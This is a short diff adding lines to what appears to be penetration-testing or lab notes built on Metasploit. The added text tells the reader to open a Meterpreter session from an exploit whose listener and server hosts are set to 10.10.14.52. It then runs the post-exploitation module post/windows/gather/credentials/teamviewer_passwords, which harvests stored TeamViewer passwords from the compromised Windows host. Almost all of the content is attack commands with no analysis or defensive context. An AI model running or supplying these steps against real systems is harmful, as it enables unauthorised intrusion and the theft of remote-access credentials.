@@ -26,3 +26,16 @@ set lhost 10.10.14.52
 set srvhost 10.10.14.52
 exploit
 
+Once get the session opened message run:
+
+sessions 1
+
+***************************************************************************************************************************
+
+Following is the post exploit metsaploit command (Teamviewr Exploit):
+
+use post/windows/gather/credentials/teamviewer_passwords
+set session 1
+exploit
+
+***************************************************************************************************************************
